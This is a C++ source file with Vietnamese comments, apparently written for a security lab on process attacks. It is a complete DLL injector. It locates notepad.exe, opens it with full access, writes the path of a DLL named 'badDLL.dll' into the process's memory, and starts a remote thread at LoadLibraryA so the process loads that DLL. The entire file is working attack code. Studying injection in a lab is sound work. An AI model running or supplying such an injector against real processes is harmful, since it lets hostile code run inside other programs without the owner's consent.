// Injector.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

// Tim PID theo ten
DWORD find_process_id(const wchar_t* process_name) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return 0;

    if (Process32First(hSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, process_name) == 0) {
                CloseHandle(hSnap);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnap, &pe32));
    }

    CloseHandle(hSnap);
    return 0;
}

int main() {
    DWORD pid = find_process_id(L"notepad.exe");
    if (pid == 0) {
        printf("Khong tim thay notepad.exe\n");
        return 1;
    }
    printf("Tim thay notepad.exe voi PID: %lu\n", pid);

    // dll path
    const char* dll_path = "C:\\Users\\admin\\Desktop\\IA\\Labs\\Tan cong process\\DLL Injection\\badDLL\\x64\\Debug\\badDLL.dll";

    // lay handle cua process
    //HANDLE OpenProcess(
    //	[in] DWORD dwDesiredAccess,
    //	[in] BOOL  bInheritHandle,
    //	[in] DWORD dwProcessId
    //);
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, 
        FALSE, 
        pid);

    // cap phat bo nho trong tien trinh dich
    //LPVOID VirtualAllocEx(
    //	[in]           HANDLE hProcess,
    //	[in, optional] LPVOID lpAddress,
    //	[in]           SIZE_T dwSize,
    //	[in]           DWORD  flAllocationType,
    //	[in]           DWORD  flProtect
    //);
    auto p = VirtualAllocEx(
        hProcess, 
        NULL, 
        strlen(dll_path),
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE);

    // Viet path den DLL
    //BOOL WriteProcessMemory(
    //	[in]  HANDLE  hProcess,
    //	[in]  LPVOID  lpBaseAddress,
    //	[in]  LPCVOID lpBuffer,
    //	[in]  SIZE_T  nSize,
    //	[out] SIZE_T * lpNumberOfBytesWritten
    //);
    WriteProcessMemory(
        hProcess, 
        p, 
        dll_path, 
        strlen(dll_path), 
        NULL);

    // tao thread tu ham LoadLibrary de process nap DLL
    //HANDLE CreateRemoteThread(
    //	[in]  HANDLE                 hProcess,
    //	[in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    //	[in]  SIZE_T                 dwStackSize,
    //	[in]  LPTHREAD_START_ROUTINE lpStartAddress,
    //	[in]  LPVOID                 lpParameter,
    //	[in]  DWORD                  dwCreationFlags,
    //	[out] LPDWORD                lpThreadId
    //);
    auto hThread = CreateRemoteThread(
        hProcess, 
        NULL, 
        0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA"),
        p, 
        0, 
        NULL);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

